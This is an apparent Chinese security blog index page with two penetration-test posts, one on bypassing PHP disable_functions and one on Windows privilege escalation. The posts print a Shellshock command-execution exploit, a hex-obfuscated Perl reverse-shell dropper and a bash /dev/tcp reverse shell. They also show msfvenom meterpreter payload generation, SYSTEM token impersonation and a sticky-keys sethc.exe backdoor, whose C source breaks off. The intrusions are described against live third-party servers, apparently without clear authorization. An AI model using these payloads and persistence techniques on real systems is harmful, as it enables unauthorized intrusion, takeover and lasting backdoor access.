<!DOCTYPE html>
<html lang="zh-Hans">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">



  <meta name="description" content="与其哀叹，不如埋头苦干"/>













  <link rel="alternate" href="/atom.xml" title="Mochazz's blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.6.0" />



<link rel="canonical" href="https://mochazz.github.io/"/>








<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.6.0" />



  



  <script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>








<script>
  window.config = {"title":"Mochazz's blog","subtitle":null,"description":"与其哀叹，不如埋头苦干","author":"Mochazz","language":"zh-Hans","timezone":"Asia/Shanghai","url":"https://mochazz.github.io","root":"/","permalink":":year/:month/:day/:title/","permalink_defaults":null,"source_dir":"source","public_dir":"public","tag_dir":"tags","archive_dir":"archives","category_dir":"categories","code_dir":"downloads/code","i18n_dir":":lang","skip_render":null,"new_post_name":":title.md","default_layout":"post","titlecase":false,"external_link":true,"filename_case":0,"render_drafts":false,"post_asset_folder":false,"relative_link":false,"future":true,"highlight":{"enable":true,"auto_detect":false,"line_number":true,"tab_replace":null,"first_line_number":"always1"},"default_category":"uncategorized","category_map":null,"tag_map":null,"date_format":"YYYY-MM-DD","time_format":"HH:mm:ss","per_page":5,"pagination_dir":"page","theme":{"color":"Default","toc":true,"fancybox":true},"deploy":{"type":"git","repo":"https://github.com/Mochazz/Mochazz.github.io.git","branch":"master"},"ignore":[],"index_generator":{"per_page":10,"order_by":"-date","path":""},"archive_generator":{"per_page":20,"yearly":true,"monthly":true,"daily":false,"order_by":"-date"},"category_generator":{"per_page":20},"tag_generator":{"per_page":20},"server":{"port":7555,"log":false,"compress":true,"header":true},"marked":{"gfm":true,"pedantic":false,"sanitize":false,"tables":true,"breaks":true,"smartLists":true,"smartypants":true,"modifyAnchors":"","autolink":true},"since":2017,"favicon":"/favicon.ico","rss":false,"menu":{"首页":"/","归档":"/archives/"},"copyright":{"enable":true,"license":"<a rel=\"license\" href=\"http://creativecommons.org/licenses/by-nc/4.0/\" target=\"_blank\">知识共享署名-非商业性使用 4.0 国际许可协议</a>"},"reward":{"enable":false,"qrCode":{"wechat":null,"alipay":null}},"social":{"email":"379032449@qq.com","stack-overflow":null,"twitter":null,"facebook":null,"linkedin":null,"google":null,"github":"https://github.com/Mochazz/","weibo":null,"zhihu":null,"douban":null,"pocket":null,"tumblr":null,"instagram":null},"baidu_analytics":null,"baidu_verification":null,"google_analytics":null,"google_verification":null,"disqus_shortname":null,"changyan":{"appid":null,"appkey":null},"livere_datauid":null,"version":"2.6.0"};
</script>

    <title> Mochazz's blog </title>
  </head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">Mochazz's blog</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    
      <a href="/">
        <li class="mobile-menu-item">
          
          
            首页
          
        </li>
      </a>
    
      <a href="/archives/">
        <li class="mobile-menu-item">
          
          
            归档
          
        </li>
      </a>
    
  </ul>
</nav>

    <div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">Mochazz's blog</a>
</div>

<nav class="site-navbar">
  
    <ul id="menu" class="menu">
      
        <li class="menu-item">
          <a class="menu-item-link" href="/">
            
            
              首页
            
          </a>
        </li>
      
        <li class="menu-item">
          <a class="menu-item-link" href="/archives/">
            
            
              归档
            
          </a>
        </li>
      
    </ul>
  
</nav>

      </header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content">
            
  <section id="posts" class="posts">
    
      
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          <a class="post-link" href="/2018/09/27/渗透测试之绕过PHP的disable_functions/">渗透测试之绕过PHP的disable_functions</a>
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-27
        </span>
        
          <div class="post-category">
            
              <a href="/categories/渗透测试/">渗透测试</a>
            
          </div>
        
        
      </div>
    </header>

    
    


    <div class="post-content">
      
        
        

        
          <p>继上篇文章之后，这次找了一台linux的机器练习渗透测试。这次的话能写入shell，但是无法执行任何命令，写入一个 <strong>phpinfo</strong> 函数查看详情，发现 <strong>disable_functions</strong> 禁用了很多函数。具体如下：</p>
<p><img src="/img/渗透测试/渗透测试之绕过PHP的disable_functions/1.png" alt="1"></p>
<p>可以看到 <strong>disable_functions </strong> 禁用了一下函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru</span><br></pre></td></tr></table></figure>
<p>于是尝试使用 <a href="https://www.exploit-db.com/exploits/35146/" target="_blank" rel="noopener"><strong>CVE-2014-6271</strong></a> ，但是没有成功。后来发现该利用方法要求 <strong>PHP &lt; 5.6.2</strong> ，而本例中的PHP版本为 <strong>5.6.30</strong> ，关于该CVE利用原理，大家可以参考 <a href="https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html" target="_blank" rel="noopener">PHP Execute Command Bypass Disable_functions</a> 这篇文章。这里也顺带贴下脚本，以备不时之需：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span></span><br><span class="line"><span class="comment"># Google Dork: none </span></span><br><span class="line"><span class="comment"># Date: 10/31/2014 </span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall) </span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net </span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2) </span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6 </span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span><span class="params">($cmd)</span> </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span></span><br><span class="line">   $tmp = tempnam(<span class="string">"."</span>,<span class="string">"data"</span>); </span><br><span class="line">   putenv(<span class="string">"PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1"</span>); </span><br><span class="line">   <span class="comment">// In Safe Mode, the user may only alter environment variableswhose names </span></span><br><span class="line">   <span class="comment">// begin with the prefixes supplied by this directive. </span></span><br><span class="line">   <span class="comment">// By default, users will only be able to set environment variablesthat </span></span><br><span class="line">   <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="doctag">Note:</span> if this directive isempty, </span></span><br><span class="line">   <span class="comment">// PHP will let the user modify ANY environment variable! </span></span><br><span class="line">   mail(<span class="string">"a@127.0.0.1"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">"-bv"</span>); <span class="comment">// -bv so we don't actuallysend any mail </span></span><br><span class="line">   $output = @file_get_contents($tmp); </span><br><span class="line">   @unlink($tmp); </span><br><span class="line">   <span class="keyword">if</span>($output != <span class="string">""</span>) <span class="keyword">return</span> $output; </span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">"No output, or not vuln."</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> shellshock($_REQUEST[<span class="string">"cmd"</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>继续通过google搜索解决方法，发现了可以利用如果开启了 <strong>pcntl</strong> 扩展，就可以利用 <strong>pcntl_exec</strong> 函数来执行命令，当然要想利用这种方法的话还是有些限制的（ <strong>PHP 4 &gt;= 4.2.0, PHP 5 on linux</strong> ）。这里直接贴出反弹shell的脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*******************************</span></span><br><span class="line"><span class="comment"> *查看phpinfo编译参数--enable-pcntl</span></span><br><span class="line"><span class="comment"> *作者 Spider</span></span><br><span class="line"><span class="comment"> *nc -vvlp 443</span></span><br><span class="line"><span class="comment">********************************/</span></span><br><span class="line"> </span><br><span class="line">$ip = <span class="string">'xxx.xxx.xxx.xxx'</span>;</span><br><span class="line">$port = <span class="string">'443'</span>;</span><br><span class="line">$file = <span class="string">'/tmp/bc.pl'</span>;</span><br><span class="line"> </span><br><span class="line">header(<span class="string">"content-Type: text/html; charset=gb2312"</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(function_exists(<span class="string">'pcntl_exec'</span>)) &#123;</span><br><span class="line">        $data = <span class="string">"\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x20\x2d\x77\x0d\x0a\x23\x0d\x0a"</span>.</span><br><span class="line">                <span class="string">"\x0d\x0a\x75\x73\x65\x20\x73\x74\x72\x69\x63\x74\x3b\x20\x20\x20\x20\x0d\x0a\x75\x73\x65\x20"</span>.</span><br><span class="line">                <span class="string">"\x53\x6f\x63\x6b\x65\x74\x3b\x0d\x0a\x75\x73\x65\x20\x49\x4f\x3a\x3a\x48\x61\x6e\x64\x6c\x65"</span>.</span><br><span class="line">                <span class="string">"\x3b\x0d\x0a\x0d\x0a\x6d\x79\x20\x24\x72\x65\x6d\x6f\x74\x65\x5f\x69\x70\x20\x3d\x20\x27"</span>.$ip.</span><br><span class="line">                <span class="string">"\x27\x3b\x0d\x0a\x6d\x79\x20\x24\x72\x65\x6d\x6f\x74\x65\x5f\x70\x6f\x72\x74\x20\x3d\x20\x27"</span>.$port.</span><br><span class="line">                <span class="string">"\x27\x3b\x0d\x0a\x0d\x0a\x6d\x79\x20\x24\x70\x72\x6f\x74\x6f\x20\x3d\x20\x67\x65\x74\x70\x72"</span>.</span><br><span class="line">                <span class="string">"\x6f\x74\x6f\x62\x79\x6e\x61\x6d\x65\x28\x22\x74\x63\x70\x22\x29\x3b\x0d\x0a\x6d\x79\x20\x24"</span>.</span><br><span class="line">                <span class="string">"\x70\x61\x63\x6b\x5f\x61\x64\x64\x72\x20\x3d\x20\x73\x6f\x63\x6b\x61\x64\x64\x72\x5f\x69\x6e"</span>.</span><br><span class="line">                <span class="string">"\x28\x24\x72\x65\x6d\x6f\x74\x65\x5f\x70\x6f\x72\x74\x2c\x20\x69\x6e\x65\x74\x5f\x61\x74\x6f"</span>.</span><br><span class="line">                <span class="string">"\x6e\x28\x24\x72\x65\x6d\x6f\x74\x65\x5f\x69\x70\x29\x29\x3b\x0d\x0a\x6d\x79\x20\x24\x73\x68"</span>.</span><br><span class="line">                <span class="string">"\x65\x6c\x6c\x20\x3d\x20\x27\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69\x27\x3b\x0d\x0a\x73\x6f"</span>.</span><br><span class="line">                <span class="string">"\x63\x6b\x65\x74\x28\x53\x4f\x43\x4b\x2c\x20\x41\x46\x5f\x49\x4e\x45\x54\x2c\x20\x53\x4f\x43"</span>.</span><br><span class="line">                <span class="string">"\x4b\x5f\x53\x54\x52\x45\x41\x4d\x2c\x20\x24\x70\x72\x6f\x74\x6f\x29\x3b\x0d\x0a\x53\x54\x44"</span>.</span><br><span class="line">                <span class="string">"\x4f\x55\x54\x2d\x3e\x61\x75\x74\x6f\x66\x6c\x75\x73\x68\x28\x31\x29\x3b\x0d\x0a\x53\x4f\x43"</span>.</span><br><span class="line">                <span class="string">"\x4b\x2d\x3e\x61\x75\x74\x6f\x66\x6c\x75\x73\x68\x28\x31\x29\x3b\x0d\x0a\x63\x6f\x6e\x6e\x65"</span>.</span><br><span class="line">                <span class="string">"\x63\x74\x28\x53\x4f\x43\x4b\x2c\x24\x70\x61\x63\x6b\x5f\x61\x64\x64\x72\x29\x20\x6f\x72\x20"</span>.</span><br><span class="line">                <span class="string">"\x64\x69\x65\x20\x22\x63\x61\x6e\x20\x6e\x6f\x74\x20\x63\x6f\x6e\x6e\x65\x63\x74\x3a\x24\x21"</span>.</span><br><span class="line">                <span class="string">"\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x49\x4e\x2c\x20\x22\x3c\x26\x53\x4f\x43\x4b"</span>.</span><br><span class="line">                <span class="string">"\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x4f\x55\x54\x2c\x20\x22\x3e\x26\x53\x4f\x43"</span>.</span><br><span class="line">                <span class="string">"\x4b\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x45\x52\x52\x2c\x20\x22\x3e\x26\x53\x4f"</span>.</span><br><span class="line">                <span class="string">"\x43\x4b\x22\x3b\x0d\x0a\x73\x79\x73\x74\x65\x6d\x28\x24\x73\x68\x65\x6c\x6c\x29\x3b\x0d\x0a"</span>.</span><br><span class="line">                <span class="string">"\x63\x6c\x6f\x73\x65\x20\x53\x4f\x43\x4b\x3b\x0d\x0a\x65\x78\x69\x74\x20\x30\x3b\x0a"</span>;</span><br><span class="line">        $fp = fopen($file,<span class="string">'w'</span>);</span><br><span class="line">        $key = fputs($fp,$data);</span><br><span class="line">        fclose($fp);</span><br><span class="line">        <span class="keyword">if</span>(!$key) <span class="keyword">exit</span>(<span class="string">'写入'</span>.$file.<span class="string">'失败'</span>);</span><br><span class="line">        chmod($file,<span class="number">0777</span>);</span><br><span class="line">        pcntl_exec($file);</span><br><span class="line">        unlink($file);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'不支持pcntl扩展'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>只要在本机上开启 <strong>nc</strong> 侦听端口，即可收到反弹回来的shell。</p>
<p><img src="/img/渗透测试/渗透测试之绕过PHP的disable_functions/2.png" alt="2"></p>
<p>接下来就是提权了。先来看一下目标的内核版本，然后通过 <strong>searchsploit</strong> 来查找可用的提权exp：</p>
<p><img src="/img/渗透测试/渗透测试之绕过PHP的disable_functions/3.png" alt="3"></p>
<p>后来在目标机器上编译失败，报错如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc pwn.c -o pwn</span><br><span class="line">gcc: error trying to <span class="built_in">exec</span> <span class="string">'cc1'</span>: execvp: No such file or directory</span><br></pre></td></tr></table></figure>
<p>还没来的及解决，管理员就将主机关闭了，测试也就到此结束。</p>
<p>后来又找了一台类似的机器，内核版本一样，但是这次没有设置 <strong>disable_functions </strong> 仍是反弹不会来，猜测目标服务器配置了流量出站规则，不允许内网机器向外连奇怪的端口。如果是这样的话，我们连常用的端口即可。于是我在机器上用 <strong>nc</strong> 侦听了80端口，用命令： <strong>/bin/bash -i &gt; /dev/tcp/IP/80 0&lt;&amp;1 2&gt;&amp;1</strong> ，随机收到了反弹回来的shell。</p>
<h3 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h3><p><a href="http://reverse-tcp.xyz/php/pentest/2016/12/22/php-disabled_functions-bypass.html" target="_blank" rel="noopener">PHP Disabled_functions Bypass</a> </p>
<p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener">PHP disable_functions Bypass的方法探究</a> </p>
<p><a href="https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html" target="_blank" rel="noopener">PHP Execute Command Bypass Disable_functions</a> </p>
<p><a href="http://www.91ri.org/8700.html" target="_blank" rel="noopener">Webshell下命令执行限制及绕过方法</a> </p>

        
      
    </div>

    

    

  </article>

    
      
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          <a class="post-link" href="/2018/09/26/渗透测试之MSF窃取Windows用户令牌/">渗透测试之MSF窃取Windows用户令牌</a>
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-26
        </span>
        
          <div class="post-category">
            
              <a href="/categories/渗透测试/">渗透测试</a>
            
          </div>
        
        
      </div>
    </header>

    
    


    <div class="post-content">
      
        
        

        
          <h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><p>首先利用自己审计的0day将一句话木马写入目标网站，使用菜刀连接上目标，打开虚拟终端查看当前拥有的用户及系统信息。可以发现，网站系统为2008 R2版本的，且打了比较多的补丁。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">D:\www\&gt; net users</span><br><span class="line"></span><br><span class="line">\\WIN-********* 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    mysql                    </span><br><span class="line">MySQL                    www</span><br><span class="line">D:\www\&gt; systeminfo</span><br><span class="line"></span><br><span class="line">主机名:           WIN-*********</span><br><span class="line">OS 名称:          Microsoft Windows Server 2008 R2 Enterprise </span><br><span class="line">OS 版本:          6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">OS 制造商:        Microsoft Corporation</span><br><span class="line">OS 配置:          独立服务器</span><br><span class="line">OS 构件类型:      Multiprocessor Free</span><br><span class="line">注册的所有人:     Windows 用户</span><br><span class="line">注册的组织:       </span><br><span class="line">产品 ID:          00486-OEM-8400691-20006</span><br><span class="line">初始安装日期:     2018/8/29, 14:37:18</span><br><span class="line">系统启动时间:     2018/9/13, 3:20:51</span><br><span class="line">系统制造商:       Gooxi</span><br><span class="line">系统型号:         SY312-S24R/SY206-S12R/SY103-S06R</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 1 个处理器。</span><br><span class="line">                  [01]: Intel64 Family 6 Model 60 Stepping 3 GenuineIntel ~3100 Mhz</span><br><span class="line">BIOS 版本:        Gooxi G1SCN-B.2.31, 2016/6/15</span><br><span class="line">Windows 目录:     C:\Windows</span><br><span class="line">系统目录:         C:\Windows\system32</span><br><span class="line">启动设备:         \Device\HarddiskVolume1</span><br><span class="line">系统区域设置:     zh-cn;中文(中国)</span><br><span class="line">输入法区域设置:   zh-cn;中文(中国)</span><br><span class="line">时区:             (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="line">物理内存总量:     8,155 MB</span><br><span class="line">可用的物理内存:   3,851 MB</span><br><span class="line">虚拟内存: 最大值: 16,308 MB</span><br><span class="line">虚拟内存: 可用:   11,083 MB</span><br><span class="line">虚拟内存: 使用中: 5,225 MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               WORKGROUP</span><br><span class="line">登录服务器:       暂缺</span><br><span class="line">修补程序:         安装了 173 个修补程序。</span><br><span class="line">                  [01]: KB981391</span><br><span class="line">                  [02]: KB981392</span><br><span class="line">                  [03]: KB977236</span><br><span class="line">                  [04]: KB981111</span><br><span class="line">                  [05]: KB977238</span><br><span class="line">                  [06]: KB2849697</span><br><span class="line">                  [07]: KB2849696</span><br><span class="line">                  ................</span><br><span class="line">                  [170]: KB4457044</span><br><span class="line">                  [171]: KB976902</span><br><span class="line">                  [172]: KB982018</span><br><span class="line">                  [173]: KB4457144</span><br><span class="line">网卡:             安装了 2 个 NIC。</span><br></pre></td></tr></table></figure>
<p>一开始我使用 <a href="https://github.com/alpha1ab/CVE-2018-8120/tree/master/CVE-2018-8120" target="_blank" rel="noopener"><strong>CVE-2018-8120</strong></a> 尝试提权，这个提权之前刚爆出来的时候还是挺好用的，然而这里提权失败。于是我打算直接使用MSF中的令牌环窃取来伪造身份进行登录。</p>
<p>首先在有公网IP地址的机器上用MSF生成反弹shell的木马，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=本机IP LPORT=本机端口 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
<p>将生成的木马上传并执行，在肉鸡上开启MSF监听，接收反弹shell：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop msfconsole</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 本机端口</span><br><span class="line">LPORT =&gt; 本机端口</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 本机IP</span><br><span class="line">LHOST =&gt; 本机IP</span><br><span class="line">msf exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 本机IP:本机要侦听的端口</span><br></pre></td></tr></table></figure>
<p>载入 <strong>incognito</strong> 插件，然后我们首先需要做的，是查看此系统上有哪些可用的令牌。用户权限不同，所能看到的令牌个数也不同。在命令框中输入： <strong>list_tokens -u</strong> 来查看可用的令牌：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use incognito</span><br><span class="line">Loading extension incognito...Success.</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">WIN-66666\Administrator</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure>
<p>接下来就是模拟这个 <strong>system</strong> 用户的令牌以获得 <strong>system</strong> 权限，在命令框中输入： <strong>impersonate_token “NT AUTHORITY\\SYSTEM”</strong> ，其中第一个反斜杠用来转义第二个反斜杠。最后用 <strong>getuid</strong> 命令查看当前用户权限。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; impersonate_token <span class="string">"NT AUTHORITY\\SYSTEM"</span></span><br><span class="line">[-] Warning: Not currently running as SYSTEM, not all tokens will be available</span><br><span class="line">             Call rev2self <span class="keyword">if</span> primary process token is SYSTEM</span><br><span class="line">[+] Delegation token available</span><br><span class="line">[+] Successfully impersonated user NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
<p>成功提权，关于窃取令牌的原理，大家可以阅读文章结尾处的相关文章。</p>
<p>由于目标是Windows系统，管理员多数会开远程桌面协议进行管理（RDP协议默认为3389端口），而一般管理员会修改默认端口为其他端口从而避免被攻击，所以这里我们使用以下命令来查看RDP的真实端口。在命令行分别输入如下命令（ <strong>tasklist /svc | findstr TermService</strong> 用来查看RDP服务的PID号，然后用 <strong>netstat -nao | findstr PID号</strong> 来查看RDP服务运行的端口号）：</p>
<p><img src="/img/渗透测试/渗透测试之MSF窃取Windows用户令牌/1.png" alt="1"></p>
<p>这样，我们就可以使用之前MSF下的system权限创建账户，然后远程登录目标系统。</p>
<p><img src="/img/渗透测试/渗透测试之MSF窃取Windows用户令牌/2.png" alt="2"></p>
<h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>为了使权限不丢失，我们可以在目标系统留一个后门。这里我喜欢将 <strong>C:\Windows\System32\sethc.exe</strong> 程序替换成cmd程序，这样我们只要打开远程登录的界面，按5下 <strong>shift</strong> 键就会以system权限调用cmd程序。然而这样留的后门很容易被人利用，所以我们可以自己用C语言写一个小程序，加入密码验证功能，让这个小程序来调用cmd程序。这里我直接贴出我的C语言代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta"># <span 